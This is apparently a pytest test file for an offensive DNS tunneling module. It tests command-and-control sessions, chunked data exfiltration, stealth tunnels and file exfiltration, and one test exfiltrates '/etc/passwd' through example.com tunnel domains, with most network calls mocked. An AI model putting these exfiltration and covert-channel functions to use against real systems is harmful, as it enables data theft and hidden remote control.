"""
Test cases for DNS Tunneling Framework
"""

import pytest
import asyncio
from unittest.mock import Mock, patch, AsyncMock
from datetime import datetime

import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

from exploits.dns_tunneling import (
    DNSTunneler, DNSRecordType, TunnelMode, DNSQuery, DNSTunnelSession
)
from exploits.multi_protocol_engine import ExploitTarget, ExploitationConfig, ExploitationMode, ProtocolType
from core.config import ConfigManager


class TestDNSRecordType:
    """Test DNS record type enum"""
    
    def test_dns_record_types(self):
        """Test DNS record type values"""
        assert DNSRecordType.A.value == "A"
        assert DNSRecordType.AAAA.value == "AAAA"
        assert DNSRecordType.TXT.value == "TXT"
        assert DNSRecordType.CNAME.value == "CNAME"
        assert DNSRecordType.MX.value == "MX"
        assert DNSRecordType.NS.value == "NS"


class TestTunnelMode:
    """Test tunnel mode enum"""
    
    def test_tunnel_modes(self):
        """Test tunnel mode values"""
        assert TunnelMode.COMMAND_CONTROL.value == "c2"
        assert TunnelMode.DATA_EXFILTRATION.value == "exfil"
        assert TunnelMode.BIDIRECTIONAL.value == "bidirectional"


class TestDNSQuery:
    """Test DNS query dataclass"""
    
    def test_dns_query_creation(self):
        """Test DNS query creation"""
        query = DNSQuery(
            domain="test.example.com",
            record_type=DNSRecordType.TXT,
            data="test_data"
        )
        
        assert query.domain == "test.example.com"
        assert query.record_type == DNSRecordType.TXT
        assert query.data == "test_data"
        assert isinstance(query.timestamp, datetime)


class TestDNSTunnelSession:
    """Test DNS tunnel session dataclass"""
    
    def test_tunnel_session_creation(self):
        """Test tunnel session creation"""
        target = ExploitTarget(
            host="8.8.8.8",
            port=53,
            protocol=ProtocolType.DNS,
            service_name="domain"
        )
        
        session = DNSTunnelSession(
            target=target,
            domain="tunnel.example.com",
            mode=TunnelMode.BIDIRECTIONAL,
            record_type=DNSRecordType.TXT
        )
        
        assert session.target == target
        assert session.domain == "tunnel.example.com"
        assert session.mode == TunnelMode.BIDIRECTIONAL
        assert session.record_type == DNSRecordType.TXT
        assert isinstance(session.established_at, datetime)
        assert isinstance(session.last_activity, datetime)
        assert session.bytes_sent == 0
        assert session.bytes_received == 0
        assert session.queries_sent == 0


class TestDNSTunneler:
    """Test cases for DNSTunneler class"""

    def setup_method(self):
        """Setup test environment"""
        self.config_manager = ConfigManager()
        self.tunneler = DNSTunneler(self.config_manager)
        
        # Test target
        self.target = ExploitTarget(
            host="8.8.8.8",
            port=53,
            protocol=ProtocolType.DNS,
            service_name="domain"
        )
        
        # Test config
        self.config = ExploitationConfig(
            mode=ExploitationMode.AUTOMATED,
            timeout=30,
            retry_attempts=3
        )

    def test_tunneler_initialization(self):
        """Test tunneler initialization"""
        assert self.tunneler.config_manager is not None
        assert self.tunneler.active_tunnels == {}
        assert self.tunneler.resolver is not None
        assert len(self.tunneler.dns_servers) > 0
        assert "8.8.8.8" in self.tunneler.dns_servers

    @pytest.mark.asyncio
    async def test_exploit_targets_success(self):
        """Test successful exploitation of targets"""
        targets = [self.target]
        
        with patch.object(self.tunneler, 'test_dns_tunneling') as mock_test:
            mock_result = Mock()
            mock_result.success = True
            mock_test.return_value = mock_result
            
            results = await self.tunneler.exploit_targets(targets, self.config)
            
            assert len(results) == 1
            assert results[0] == mock_result
            mock_test.assert_called_once_with(self.target, self.config)

    @pytest.mark.asyncio
    async def test_exploit_targets_failure(self):
        """Test exploitation failure handling"""
        targets = [self.target]
        
        with patch.object(self.tunneler, 'test_dns_tunneling') as mock_test:
            mock_test.side_effect = Exception("DNS test failed")
            
            results = await self.tunneler.exploit_targets(targets, self.config)
            
            assert len(results) == 1
            assert results[0].success is False
            assert "DNS test failed" in results[0].error_message

    @pytest.mark.asyncio
    async def test_test_dns_record_type_success(self):
        """Test successful DNS record type testing"""
        with patch('asyncio.to_thread') as mock_to_thread:
            # Mock successful DNS resolution
            mock_answer = [Mock()]
            mock_to_thread.return_value = mock_answer
            
            result = await self.tunneler._test_dns_record_type(
                self.target, DNSRecordType.TXT, self.config
            )
            
            assert result is True
            mock_to_thread.assert_called_once()

    @pytest.mark.asyncio
    async def test_test_dns_record_type_failure(self):
        """Test DNS record type testing failure"""
        with patch('asyncio.to_thread') as mock_to_thread:
            mock_to_thread.side_effect = Exception("DNS resolution failed")
            
            result = await self.tunneler._test_dns_record_type(
                self.target, DNSRecordType.TXT, self.config
            )
            
            assert result is False

    @pytest.mark.asyncio
    async def test_establish_tunnel(self):
        """Test tunnel establishment"""
        domain = "tunnel.example.com"
        
        session_id = await self.tunneler.establish_tunnel(
            self.target, domain, TunnelMode.BIDIRECTIONAL, DNSRecordType.TXT
        )
        
        assert session_id is not None
        assert len(session_id) == 16  # Generated session ID length
        assert session_id in self.tunneler.active_tunnels
        
        session = self.tunneler.active_tunnels[session_id]
        assert session.target == self.target
        assert session.domain == domain
        assert session.mode == TunnelMode.BIDIRECTIONAL
        assert session.record_type == DNSRecordType.TXT

    @pytest.mark.asyncio
    async def test_send_command_success(self):
        """Test successful command sending"""
        # First establish a tunnel
        session_id = await self.tunneler.establish_tunnel(
            self.target, "tunnel.example.com"
        )
        
        with patch('asyncio.to_thread') as mock_to_thread:
            # Mock DNS response with base64 encoded data
            mock_record = Mock()
            mock_record.__str__ = Mock(return_value='"dGVzdCByZXNwb25zZQ=="')  # "test response" in base64
            mock_answer = [mock_record]
            mock_to_thread.return_value = mock_answer

            response = await self.tunneler.send_command(session_id, "test command")

            assert response == "test response"
            mock_to_thread.assert_called_once()

    @pytest.mark.asyncio
    async def test_send_command_no_session(self):
        """Test command sending with invalid session"""
        response = await self.tunneler.send_command("invalid_session", "test command")
        assert response is None

    @pytest.mark.asyncio
    async def test_exfiltrate_data_success(self):
        """Test successful data exfiltration"""
        # First establish a tunnel
        session_id = await self.tunneler.establish_tunnel(
            self.target, "tunnel.example.com"
        )
        
        with patch('asyncio.to_thread') as mock_to_thread:
            with patch('asyncio.sleep'):
                mock_to_thread.return_value = []  # Mock DNS resolution

                result = await self.tunneler.exfiltrate_data(session_id, "test data", chunk_size=10)

                assert result is True
                # Should have made DNS queries for data chunks
                assert mock_to_thread.call_count > 0

    @pytest.mark.asyncio
    async def test_exfiltrate_data_no_session(self):
        """Test data exfiltration with invalid session"""
        result = await self.tunneler.exfiltrate_data("invalid_session", "test data")
        assert result is False

    @pytest.mark.asyncio
    async def test_create_covert_channel(self):
        """Test covert channel creation"""
        domain = "covert.example.com"
        
        with patch.object(self.tunneler, 'establish_tunnel') as mock_establish:
            mock_establish.return_value = "test_session_id"
            
            session_id = await self.tunneler.create_covert_channel(self.target, domain)
            
            assert session_id == "test_session_id"
            mock_establish.assert_called_once_with(
                self.target, domain, TunnelMode.BIDIRECTIONAL, DNSRecordType.TXT
            )

    def test_generate_session_id(self):
        """Test session ID generation"""
        session_id = self.tunneler._generate_session_id()
        
        assert len(session_id) == 16
        assert session_id.isalnum()

    def test_encode_dns_data(self):
        """Test DNS data encoding"""
        test_data = "Hello, World!"
        encoded = self.tunneler._encode_dns_data(test_data)

        # Should return a list of chunks
        assert isinstance(encoded, list)
        assert len(encoded) > 0
        # Should be DNS-safe (no + characters, replaced with -)
        for chunk in encoded:
            assert '+' not in chunk

    def test_decode_dns_data(self):
        """Test DNS data decoding"""
        test_data = "Hello, World!"
        # Use the actual encoding method to get proper chunks
        encoded_chunks = self.tunneler._encode_dns_data(test_data)

        decoded = self.tunneler._decode_dns_data(encoded_chunks)
        assert decoded == test_data

    def test_close_tunnel(self):
        """Test tunnel closure"""
        # Create a mock tunnel session
        session_id = "test_session"
        mock_session = Mock()
        self.tunneler.active_tunnels[session_id] = mock_session
        
        result = self.tunneler.close_tunnel(session_id)
        
        assert result is True
        assert session_id not in self.tunneler.active_tunnels

    def test_close_tunnel_invalid_session(self):
        """Test closing invalid tunnel session"""
        result = self.tunneler.close_tunnel("invalid_session")
        assert result is False

    def test_get_tunnel_stats(self):
        """Test tunnel statistics retrieval"""
        # Create mock tunnel sessions
        session1 = Mock()
        session1.domain = "test1.com"
        session1.mode.value = "bidirectional"
        session1.record_type.value = "TXT"
        session1.established_at.isoformat.return_value = "2023-01-01T00:00:00"
        session1.last_activity.isoformat.return_value = "2023-01-01T01:00:00"
        session1.bytes_sent = 100
        session1.bytes_received = 200
        session1.queries_sent = 5
        
        self.tunneler.active_tunnels["session1"] = session1
        
        stats = self.tunneler.get_tunnel_statistics()
        
        assert stats['active_tunnels'] == 1
        assert stats['total_bytes_sent'] == 100
        assert stats['total_bytes_received'] == 200
        assert stats['total_queries'] == 5
        assert len(stats['tunnels']) == 1

    @pytest.mark.asyncio
    async def test_test_dns_over_https(self):
        """Test DNS over HTTPS capability testing"""
        with patch('aiohttp.ClientSession') as mock_session_class:
            mock_session = AsyncMock()
            mock_response = AsyncMock()
            mock_response.status = 200

            # Properly mock the async context manager chain
            mock_session.post.return_value.__aenter__ = AsyncMock(return_value=mock_response)
            mock_session_class.return_value.__aenter__ = AsyncMock(return_value=mock_session)

            result = await self.tunneler.test_dns_over_https(self.target)

            assert result is True

    @pytest.mark.asyncio
    async def test_test_dns_over_https_failure(self):
        """Test DNS over HTTPS failure"""
        with patch('aiohttp.ClientSession') as mock_session_class:
            mock_session_class.side_effect = Exception("Connection failed")

            result = await self.tunneler.test_dns_over_https(self.target)

            assert result is False

    @pytest.mark.asyncio
    async def test_test_dns_over_tls_success(self):
        """Test DNS over TLS capability testing"""
        with patch('asyncio.open_connection') as mock_open_connection:
            mock_reader = AsyncMock()
            mock_writer = AsyncMock()

            # Mock successful TLS connection and response
            mock_reader.read.side_effect = [
                b'\x00\x20',  # Response length (32 bytes)
                b'x' * 32     # Mock DNS response data
            ]
            mock_open_connection.return_value = (mock_reader, mock_writer)

            result = await self.tunneler.test_dns_over_tls(self.target)

            assert result is True
            mock_writer.close.assert_called()

    @pytest.mark.asyncio
    async def test_test_dns_over_tls_failure(self):
        """Test DNS over TLS failure"""
        with patch('asyncio.open_connection') as mock_open_connection:
            mock_open_connection.side_effect = Exception("TLS connection failed")

            result = await self.tunneler.test_dns_over_tls(self.target)

            assert result is False

    @pytest.mark.asyncio
    async def test_create_stealth_tunnel(self):
        """Test stealth tunnel creation"""
        domain = "stealth.example.com"

        # Now test the stealth tunnel creation
        stealth_session_id = await self.tunneler.create_stealth_tunnel(self.target, domain)

        assert stealth_session_id is not None
        assert stealth_session_id in self.tunneler.active_tunnels

    @pytest.mark.asyncio
    async def test_create_stealth_tunnel_failure(self):
        """Test stealth tunnel creation failure"""
        domain = "stealth.example.com"

        with patch.object(self.tunneler, 'establish_tunnel') as mock_establish:
            mock_establish.return_value = None

            session_id = await self.tunneler.create_stealth_tunnel(self.target, domain)

            assert session_id is None

    @pytest.mark.asyncio
    async def test_exfiltrate_file(self):
        """Test file exfiltration"""
        # First establish a tunnel
        session_id = await self.tunneler.establish_tunnel(
            self.target, "tunnel.example.com"
        )

        result = await self.tunneler.exfiltrate_file(
            session_id, "/etc/passwd", "target.example.com"
        )

        # Currently returns True as it's a placeholder implementation
        assert result is True

    @pytest.mark.asyncio
    async def test_exfiltrate_file_no_session(self):
        """Test file exfiltration with invalid session"""
        result = await self.tunneler.exfiltrate_file(
            "invalid_session", "/etc/passwd", "target.example.com"
        )

        assert result is False

    @pytest.mark.asyncio
    async def test_monitor_dns_traffic(self):
        """Test DNS traffic monitoring"""
        with patch('asyncio.sleep') as mock_sleep:
            # Mock short monitoring duration
            mock_sleep.side_effect = [None, None, None]  # 3 iterations

            with patch('time.time') as mock_time:
                # Mock time progression
                mock_time.side_effect = [0, 0.5, 1.0, 1.5, 2.0]  # Simulate 2 seconds

                stats = await self.tunneler.monitor_dns_traffic(self.target, duration=2)

                assert 'queries_observed' in stats
                assert 'duration' in stats
                assert 'queries' in stats
                assert 'potential_tunneling' in stats
                assert isinstance(stats['queries'], list)

    @pytest.mark.asyncio
    async def test_test_dns_tunneling_comprehensive(self):
        """Test comprehensive DNS tunneling capability testing"""
        with patch.object(self.tunneler, '_test_dns_record_type') as mock_test_record:
            # Mock different record type results
            mock_test_record.side_effect = [True, False, True]  # TXT=True, A=False, CNAME=True

            result = await self.tunneler.test_dns_tunneling(self.target, self.config)

            assert result.success is True
            assert result.exploit_type == "dns_tunneling_test"
            assert 'supported_record_types' in result.additional_data
            assert 'TXT' in result.additional_data['supported_record_types']
            assert 'CNAME' in result.additional_data['supported_record_types']
            assert 'A' not in result.additional_data['supported_record_types']

    @pytest.mark.asyncio
    async def test_test_dns_tunneling_no_methods(self):
        """Test DNS tunneling when no methods work"""
        with patch.object(self.tunneler, '_test_dns_record_type') as mock_test_record:
            # Mock all record types failing
            mock_test_record.return_value = False

            result = await self.tunneler.test_dns_tunneling(self.target, self.config)

            assert result.success is False
            assert "No DNS tunneling methods available" in result.error_message

    def test_dns_data_encoding_decoding_roundtrip(self):
        """Test DNS data encoding/decoding roundtrip"""
        original_data = "This is a test message with special characters: !@#$%^&*()"

        # Encode
        encoded = self.tunneler._encode_dns_data(original_data)

        # Decode (encoded is already a list of chunks)
        decoded = self.tunneler._decode_dns_data(encoded)

        assert decoded == original_data

    def test_dns_data_encoding_chunking(self):
        """Test DNS data encoding with chunking"""
        long_data = "A" * 200  # Long string that will be chunked

        encoded = self.tunneler._encode_dns_data(long_data, max_length=50)

        # Should return multiple chunks
        assert isinstance(encoded, list)
        assert len(encoded) > 1

        # Decode all chunks
        decoded = self.tunneler._decode_dns_data(encoded)
        assert decoded == long_data

    @pytest.mark.asyncio
    async def test_stealth_mode_delay(self):
        """Test stealth mode introduces delays"""
        targets = [self.target]
        stealth_config = ExploitationConfig(
            mode=ExploitationMode.STEALTH,
            stealth_delay=0.1
        )

        with patch.object(self.tunneler, 'test_dns_tunneling') as mock_test:
            with patch('asyncio.sleep') as mock_sleep:
                mock_result = Mock()
                mock_result.success = True
                mock_test.return_value = mock_result

                await self.tunneler.exploit_targets(targets, stealth_config)

                # Should have called sleep for stealth delay
                mock_sleep.assert_called_with(stealth_config.stealth_delay)

    def test_session_id_uniqueness(self):
        """Test that generated session IDs are unique"""
        session_ids = set()

        for _ in range(100):
            session_id = self.tunneler._generate_session_id()
            assert session_id not in session_ids
            session_ids.add(session_id)

        assert len(session_ids) == 100

    @pytest.mark.asyncio
    async def test_multiple_tunnel_sessions(self):
        """Test managing multiple tunnel sessions"""
        domain1 = "tunnel1.example.com"
        domain2 = "tunnel2.example.com"

        # Establish multiple tunnels
        session_id1 = await self.tunneler.establish_tunnel(self.target, domain1)
        session_id2 = await self.tunneler.establish_tunnel(self.target, domain2)

        assert session_id1 != session_id2
        assert len(self.tunneler.active_tunnels) == 2

        # Close one tunnel
        self.tunneler.close_tunnel(session_id1)
        assert len(self.tunneler.active_tunnels) == 1
        assert session_id2 in self.tunneler.active_tunnels

    def test_tunnel_session_statistics_update(self):
        """Test tunnel session statistics are updated correctly"""
        # Create a tunnel session manually for testing
        session = DNSTunnelSession(
            target=self.target,
            domain="test.example.com",
            mode=TunnelMode.BIDIRECTIONAL,
            record_type=DNSRecordType.TXT
        )

        session_id = "test_session"
        self.tunneler.active_tunnels[session_id] = session

        # Simulate updating statistics
        session.bytes_sent += 100
        session.bytes_received += 200
        session.queries_sent += 5

        stats = self.tunneler.get_tunnel_statistics()

        assert stats['total_bytes_sent'] == 100
        assert stats['total_bytes_received'] == 200
        assert stats['total_queries'] == 5
